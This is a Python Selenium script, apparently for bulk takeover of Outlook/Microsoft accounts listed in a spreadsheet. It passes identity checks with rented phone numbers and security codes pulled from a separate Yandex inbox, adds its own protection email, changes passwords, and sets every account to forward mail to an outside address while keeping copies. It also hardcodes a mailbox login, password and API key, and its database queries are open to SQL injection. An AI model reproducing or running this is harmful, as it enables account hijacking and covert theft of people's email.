print("STARTING CODE")
import argparse
import requests
import time
import os
import sqlite3

import pandas as pd
from datetime import datetime
from imap_tools import MailBox, AND
import imaplib
import email

from requests_html import HTML

from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common import TimeoutException
from selenium.webdriver.firefox.options import Options
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import wait
from selenium.webdriver import ActionChains

parser = argparse.ArgumentParser()

parser.add_argument('--data', type=str, default="forwarding_mail_data.xlsx")
args = parser.parse_args()

excel_data = pd.read_excel(args.data, "Data")

excel_data2 = pd.read_excel(args.data, "Mail_Main")
MAIN_EMAIL = excel_data2['main_email'][0]
MAIN_EMAIL_PASSWORD = excel_data2['main_password'][0]
NUM_WORKER = excel_data2['nums_worker'][0]
# PATH_FIREFOX = excel_data2['path_firefox'][0]

print(f"MAIN_EMAIL: {MAIN_EMAIL}")
print(f"MAIN_EMAIL_PASSWORD: {MAIN_EMAIL_PASSWORD}")
print(f"NUM_WORKER: {NUM_WORKER}")
# print(f"PATH_FIREFOX: {PATH_FIREFOX}")

options = Options()
options.set_preference('intl.accept_languages', 'en-GB')
options.set_preference("permissions.default.image", 2)
# options.binary_location = r"{}".format(PATH_FIREFOX)

options.headless = True
pool = ThreadPoolExecutor(max_workers=NUM_WORKER)

# options.headless = False
# pool = ThreadPoolExecutor(max_workers=1)

data = pd.DataFrame(excel_data, columns=['email', 'password', 'email_protect'])

emails = []
for ind, row in data.iterrows():
    emails.append([row['email'], row['password'], row['email_protect']])

results = []
print("TIME START: ", time.time())


def init_mailbox():

    browser = webdriver.Firefox(options=options)
    browser.get("https://passport.yandex.ru/auth?retpath=https%3A%2F%2Fmail.yandex.ru%2F&backpath=https%3A%2F%2Fmail.yandex.ru%2F%3Fnoretpath%3D1&from=mail&origin=hostroot_homer_auth_ru")
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "passp-field-login"))).send_keys("nhanmailao@minh.live")
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "passp:sign-in"))).click()
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "passp-field-passwd"))).send_keys("Team123@")
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "passp:sign-in"))).click()
    time.sleep(5)
    browser.get('https://mail.yandex.ru/?uid=1130000057343225#thread/t179862510118279515')

    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, '//div[contains(@aria-label, "Microsoft account team, Microsoft account security code,")]')))
    return browser


browser_ = init_mailbox()


def mask_as_read(browser, code_of_mail):
    click_Menu = browser.find_element(By.XPATH, f'//div[contains(@aria-label, "{code_of_mail}")]')
    action = ActionChains(browser)
    action.context_click(click_Menu).perform()
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//span[@class='mail-Toolbar-Item-Text js-toolbar-item-title js-toolbar-item-title-mark-as-read']"))).click()


def get_code_by_selenium(browser, mail_input):
    emails = browser.find_elements(By.XPATH, '//div[contains(@aria-label, "unread, Microsoft account team, Microsoft account security code,")]')
    print(len(emails))

    code = None
    mail_s = mail_input.split("@")[0]
    mail_n = mail_s[0] + mail_s[1] + "**" + mail_s[-1]
    try:
        for mail_unread in emails:
            if mail_n in mail_unread.text:
                mail_unread_text = mail_unread.text
                security_code_str = "Security code: "
                if_you_str = "If you"
                ind1 = mail_unread_text.find(security_code_str)
                ind2 = mail_unread_text.find(if_you_str)
                code = mail_unread_text[ind1 + len(security_code_str): ind2].strip()
                print("code: ", code, mail_input)
                mask_as_read(browser, code)
    except:
        pass

    return code


def get_phone():
    url = "https://chothuesimcode.com/api?act=number&apik=3fbef40e&appId=1017&carrier=Viettel"
    payload = {}
    headers = {}
    response = requests.request("GET", url, headers=headers, data=payload)
    if response.json()["Msg"] == "OK":
        num_phone = response.json()["Result"]["Number"]
        id_phone = response.json()["Result"]["Id"]
        return num_phone, id_phone
    else:
        return -1, -1


def get_code(id_phone):
    url = f"https://chothuesimcode.com/api?act=code&apik=3fbef40e&id={id_phone}"
    print(url)
    payload = {}
    headers = {}
    response = requests.request("GET", url, headers=headers, data=payload)
    print("response", response.json())
    if response.json()["Msg"] == "???? nh???n ???????c code":
        return response.json()["Result"]["Code"], response.json()["ResponseCode"]
    elif response.json()["Msg"] == "kh??ng nh???n ???????c code, qu?? th???i gian ch???":
        return -2, -2
    else:
        return -1, -1


def login_with_account(email_text, password_text):
    browser = webdriver.Firefox(options=options)
    browser.get('https://login.live.com')
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "i0116"))).send_keys(email_text)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "i0118"))).send_keys(password_text)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
    return browser


def process_security_email(browser, email_protect_text):
    code = ""
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
    WebDriverWait(browser, 100).until(
        EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect_text)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
    for i in range(50):
        time.sleep(2)
        try:
            # code = get_verify_code(mail=email_protect_text, seen=False)
            code = get_code_by_selenium(browser=browser_, mail_input=email_protect_text)
            print("process_security_email:::", code, email_protect_text)
            if code is not None:
                break
        except:
            pass
    if code == "":
        return browser

    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()

    for i in range(20):
        time.sleep(2)
        check_loaded_page = page_has_loaded(browser)
        if check_loaded_page:
            break
        else:
            pass
    if "The wrong code was entered" in browser.page_source:
        browser = process_security_email(browser, email_protect_text)
    try:
        WebDriverWait(browser, 3).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
    except Exception as e:
        pass
    print("process_security_email done::: ", email_protect_text)
    return browser


def add_mail_protect(browser, email_protect_text):
    code = ""
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "EmailAddress"))).send_keys(email_protect_text)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
    print("MAIL::: ", email_protect_text)
    for i in range(20):
        time.sleep(2)
        try:
            # code = get_verify_code(mail=email_protect_text, seen=False)
            code = get_code_by_selenium(browser=browser_, mail_input=email_protect_text)
            print("add_mail_protect::: ", code)
            if code is not None and code != -1:
                break
        except:
            pass

    if code == "":
        return browser

    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
    print("add_mail_protect done ::: ", email_protect_text)
    return browser


def enter_email_forwarding(browser, email_protect_text):
    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
    time.sleep(3)
    try:
        WebDriverWait(browser, 2).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
    except Exception as e:
        pass

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Enable forwarding']"))).click()

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//*[text()='Keep a copy of forwarded messages']"))).click()

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(
        email_protect_text.split("@")[0])

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("@")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("m")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("n")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("h")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(".")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("l")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("v")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("e")

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass
    WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Save']"))).click()

    print("SUCCESS add forwarding mail: ", email_protect_text)
    return browser


def process_code_verify(browser, phone_num_id, nums0=0, nums1=0):
    try:
        time.sleep(2)
        phone_code_verify, reponse_code = get_code(phone_num_id)
        print("nums get phone111: ", nums0, nums1, phone_num_id, reponse_code)
        if reponse_code == 0:
            return phone_code_verify
        if nums1 == 4:
            return None
        if reponse_code == -1:
            if nums0 == 7:
                try:
                    WebDriverWait(browser, 3).until(
                        EC.element_to_be_clickable((By.XPATH, "//*[text()='I didn???t get a code']"))).click()
                except:
                    pass
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//input"))).clear()
                time.sleep(2)
                phone_num1, phone_num_id1 = get_phone()
                print("rebuy_phone_th1", phone_num1, phone_num_id1)
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//input"))).send_keys(
                    phone_num1)
                WebDriverWait(browser, 100).until(
                    EC.element_to_be_clickable((By.XPATH, "//*[text()='Send code']"))).click()
                return process_code_verify(browser, phone_num_id1, 0, nums1 + 1)
            return process_code_verify(browser, phone_num_id, nums0 + 1, nums1)

    except Exception as e:
        print("Exception when process_code_verify: ", e)
        return None


def process_code_verify23(browser, phone_num_id, nums0=0, nums1=0):
    try:
        time.sleep(2)
        phone_code_verify, reponse_code = get_code(phone_num_id)
        print("nums get phone2323: ", nums0, nums1, phone_num_id, reponse_code)

        if reponse_code == 0:
            return phone_code_verify
        if nums1 == 4:
            return None

        if reponse_code == -1:
            if nums0 == 7:
                browser.get("https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idAddPhoneAliasLink"))).click()
                WebDriverWait(browser, 100).until(
                    EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                phone_num1, phone_num_id1 = get_phone()
                print("rebuy_SDT truong hop 2-3: ", phone_num1, phone_num_id1)
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "DisplayPhoneNumber"))).send_keys(
                    phone_num1)
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()
                return process_code_verify23(browser, phone_num_id1, 0, nums1 + 1)
            return process_code_verify23(browser, phone_num_id, nums0 + 1, nums1)
    except Exception as e:
        print("Exception when process_code_verify: ", e)
        return None


def insert_db(mail):
    try:
        with sqlite3.connect("database_mail.db") as con:
            cur = con.cursor()
            cur.execute(f"INSERT INTO mail_tabel_all VALUES ('{mail}') ")
            con.commit()
        print("success --- insert into database: ", mail)
    except:
        print("error --- insert into database: ", mail)


def check_mail_used(mail):
    with sqlite3.connect('database_mail.db') as con:
        cur = con.cursor()
        record = cur.execute(f'''select * from mail_tabel_all where mail = "{mail}" ''')

        if len(record.fetchall()):
            return "Mail used"
        else:
            return "New mail"


def process(account):
    print("-" * 100)
    print(account)

    email_text = account[0]
    password_text = account[1]
    email_protect_text = account[2]

    # check email used
    mail_used = check_mail_used(email_text)
    if mail_used == "Mail usedd":
        status = "forwarded"
        print("forwarded: ", email_text)
    else:

        browser = login_with_account(email_text, password_text)
        print("LOGIN SUCCESS")

        # time.sleep(8)
        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
        if "We've detected something unusual about this sign-in. For example, you might be signing in from a new location, device or app." in browser.page_source:
            try:
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "proofDiv0"))).click()
            except:
                pass
            reactive_mail(browser, email_protect_text)
            status = "re_active mail1"
        elif "For your security and to ensure that only you have access to your account, we will ask you to verify your identity and change your password." in browser.page_source:
            WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iLandingViewAction"))).click()
            try:
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "proofDiv0"))).click()
                reactive_mail2(browser, email_protect_text)
                status = "change password"
                password_text = password_text + "!"
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iPassword"))).send_keys(
                    password_text)
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iPasswordViewAction"))).click()
                try:
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.ID, "iReviewProofsViewAction"))).click()
                except:
                    pass
            except:

                # WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                # phone_num_th11, phone_num_id_th11 = get_phone()
                # print("SDT truong hop 1*: ", phone_num_th11, phone_num_id_th11, email_protect_text)
                # WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "DisplayPhoneNumber"))).send_keys(phone_num_th11)  # nhap sdt# nhap sdt
                # WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iCollectPhoneViewAction"))).click()
                # phone_code_verify11 = process_code_verify23(browser, phone_num_id_th11, 0, 0)
                # print("phone_code_verify th 1*: ", phone_code_verify11)
                # if phone_code_verify11 is None:
                #     browser.close()
                #     results.append([email_text, password_text, email_protect_text, "Chua thue dc sdt"])
                #     print(f"Chua thue dc sdt_1*: {results}")
                #     return
                #
                # WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(phone_code_verify11)  # nhap code
                # WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iVerifyPhoneViewAction"))).click() # nhap code
                #
                # status = "change password"
                # password_text = password_text + "!"
                # WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iPassword"))).send_keys(password_text) # nhap code
                # WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iPasswordViewAction"))).click() # nhap code
                # try:
                #     WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iReviewProofsViewAction"))).click()
                # except: pass
                status = "re_active mail by phone number"



        else:

            try:
                # gap truong hop 1 chua lam
                WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "StartAction"))).click()

                print("gap truong hop 1 chua lam: ", email_text)
                try:
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                    phone_num, phone_num_id = get_phone()
                    print("SDT truong hop 1: ", phone_num, phone_num)
                    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//input"))).send_keys(
                        phone_num)
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.XPATH, "//*[text()='Send code']"))).click()

                    phone_code_verify = process_code_verify(browser, phone_num_id, 0, 0)
                    print("phone_code_verify th1: ", phone_code_verify)
                    if phone_code_verify is None:
                        browser.close()
                        results.append([email_text, password_text, email_protect_text, "Chua thue dc sdt"])
                        print(f"Chua thue dc sdt_1: {results}")
                        return

                    WebDriverWait(browser, 100).until(EC.element_to_be_clickable(
                        (By.XPATH, "//input[@aria-label='Enter the access code']"))).send_keys(phone_code_verify)
                    try:
                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "ProofAction"))).click()
                    except:
                        browser.close()
                        results.append([email_text, password_text, email_protect_text, "Chua thue dc sdt"])
                        return
                    time.sleep(2)

                    try:
                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "FinishAction"))).click()
                    except Exception as e:
                        pass
                    try:
                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idBtn_Back"))).click()
                    except Exception as e:
                        pass

                    time.sleep(2)
                    browser.get("https://outlook.live.com/mail/0/options/mail/layout")
                    try:
                        browser = add_mail_protect(browser, email_protect_text)
                    except Exception as e:
                        pass

                    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                    time.sleep(3)

                    try:
                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
                        browser = process_security_email(browser, email_protect_text)
                    except Exception as e:

                        pass
                    try:
                        WebDriverWait(browser, 3).until(
                            EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
                    except Exception as e:
                        pass
                    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                    time.sleep(3)
                    try:
                        browser = enter_email_forwarding(browser, email_protect_text)

                        status = "success"
                        # insert_db(email_text)
                        print("Lam xong truong hop 1: ", email_protect_text)
                    except Exception as e:
                        browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                        status = "Error: web can't loaded"
                        print("Truong hop 1 bi loi: ", email_protect_text)
                except Exception as e:
                    browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                    status = "Error"
                    print("Truong hop 1 bi loi: ", email_protect_text)

            except:
                try:
                    # gap truong hop 2 hoac 3 chua lam
                    browser.get("https://outlook.live.com/mail/0/options/mail/layout")
                    print("gap truong hop 2 hoac 3 chua lam: ", email_text)
                    try:
                        WebDriverWait(browser, 100).until(
                            EC.element_to_be_clickable((By.XPATH, "//*[text()='Sign in']"))).click()
                        time.sleep(5)
                    except:
                        print("Can't click sign in")
                    # WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                    check_page_loaded = False
                    for i in range(100):
                        time.sleep(1)
                        check_page_loaded = page_has_loaded(browser)
                        if check_page_loaded:
                            print("PAGE LOAD COMPLETE")
                            break
                        else:
                            pass
                    if not check_page_loaded:
                        print("PAGE LOAD ERROR")

                    if check_page_loaded:
                        if "Help us protect your account" in browser.page_source:
                            try:
                                browser = add_mail_protect(browser, email_protect_text)
                                time.sleep(3)

                                print("cccccccccc: ", email_protect_text)
                                browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                                print("dddddddddd: ", email_protect_text)

                                browser = process_security_email(browser, email_protect_text)
                                print("eeeeeeeeeeeee: ", email_protect_text)
                                time.sleep(3)
                                print("Hoan thanh add email protect ", email_protect_text)
                            except:
                                print("Chua hoan thanh add_mail_protect: ", email_protect_text)

                                pass

                        else:
                            print("Nhap mail bao ve: ", email_protect_text)
                            browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                            time.sleep(3)
                            WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
                            try:
                                browser = process_security_email(browser, email_protect_text)
                                print("Hoan thanh process_security_email: ", email_protect_text)
                            except Exception as e:
                                print(
                                    "Chua hoan thanh process_security_email: ",
                                    email_protect_text)
                                pass

                    # them process_security_email vao day
                    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                    time.sleep(3)

                    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                    time.sleep(3)

                    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "lpv")))
                    if "Unable to load these settings. Please try again later" in browser.page_source:
                        print("Chua thue dc sdt: ", email_text)

                        browser.get(
                            "https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                        for i in range(10):
                            try:
                                WebDriverWait(browser, 30).until(
                                    EC.element_to_be_clickable((By.ID, "idAddPhoneAliasLink"))).click()
                                break
                            except:
                                browser.get(
                                    "https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                        WebDriverWait(browser, 100).until(
                            EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                        phone_num_th23, phone_num_id_th23 = get_phone()
                        print("SDT truong hop 2-3: ", phone_num_th23, phone_num_id_th23)
                        WebDriverWait(browser, 100).until(
                            EC.element_to_be_clickable((By.ID, "DisplayPhoneNumber"))).send_keys(
                            phone_num_th23)  # nhap sdt
                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()
                        phone_code_verify23 = process_code_verify23(browser, phone_num_id_th23, 0, 0)
                        print("phone_code_verify th 2-3: ", phone_code_verify23)
                        if phone_code_verify23 is None:
                            browser.close()
                            results.append([email_text, password_text, email_protect_text, "Chua thue dc sdt"])
                            print(f"Chua thue dc sdt_23: {results}")
                            return

                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(
                            phone_code_verify23)  # nhap code
                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()

                        time.sleep(2)

                    else:
                        print("Da thue duoc so dien thoai", email_text)

                    browser.close()
                    browser = login_with_account(email_text, password_text)
                    time.sleep(2)
                    browser.get("https://outlook.live.com/mail/0/options/mail/layout")
                    WebDriverWait(browser, 60).until(
                        EC.element_to_be_clickable((By.XPATH, "//*[text()='Sign in']"))).click()
                    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                    time.sleep(3)
                    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
                    browser = process_security_email(browser, email_protect_text)
                    WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                    time.sleep(3)

                    try:
                        browser = enter_email_forwarding(browser, email_protect_text)
                        status = "success"
                        insert_db(email_text)
                        time.sleep(2)
                    except:
                        browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                        print("Error when add email forwarding", email_text)
                        status = "Error when add email forwarding"

                    try:
                        browser.get(
                            "https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                        # xoa sdt
                        check_page_loaded = False
                        for i in range(100):
                            time.sleep(1)
                            check_page_loaded = page_has_loaded(browser)
                            if check_page_loaded:
                                print("PAGE LOAD COMPLETE1")
                                break
                            else:
                                pass
                        if not check_page_loaded:
                            print("PAGE LOAD ERROR1")
                        if check_page_loaded:
                            try:
                                WebDriverWait(browser, 10).until(
                                    EC.element_to_be_clickable((By.ID, "idRemoveAssocPhone"))).click()
                                WebDriverWait(browser, 10).until(
                                    EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()
                            except:
                                pass
                    except:
                        print("Chua hoan thanh xoa sdt 23: ", email_protect_text)

                    # print("Lam xong truong hop 2-3: ", email_protect_text)
                except Exception as e:
                    browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                    status = "Error"
                    print("Truong hop 2-3 bi loi", email_text)

        browser.close()
    results.append([email_text, password_text, email_protect_text, status])
    # print("RESULTS: ", results)


def page_has_loaded(browser):
    page_state = browser.execute_script('return document.readyState;')
    return page_state == 'complete'


def reactive_mail(browser, email_protect_text):
    code = ""
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iProofEmail"))).send_keys(
        email_protect_text.split("@")[0])
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iSelectProofAction"))).click()
    for i in range(50):
        time.sleep(2)
        # code = get_verify_code(mail=email_protect_text, seen=False)
        code = get_code_by_selenium(browser=browser_, mail_input=email_protect_text)
        print("re_active mail: ", code)
        if code is not None:
            break
    if code == "":
        return browser

    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iVerifyCodeAction"))).click()


def reactive_mail2(browser, email_protect_text):
    code = ""
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iProofEmail"))).send_keys(
        email_protect_text.split("@")[0])
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iSelectProofAction"))).click()
    for i in range(50):
        time.sleep(2)
        # code = get_verify_code(mail=email_protect_text, seen=False)
        code = get_code_by_selenium(browser=browser_, mail_input=email_protect_text)
        print("re_active mail: ", code)
        if code is not None:
            break
    if code == "":
        return browser

    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iVerifyCodeAction"))).click()


if __name__ == '__main__':
    future = [pool.submit(process, mail) for mail in emails]
    wait(future)
    print("All task done.")
    results_df = pd.DataFrame(results, columns=["email", "password", "email_protect", "status"])
    results_df.to_excel(f"results_{time.time()}.xlsx")
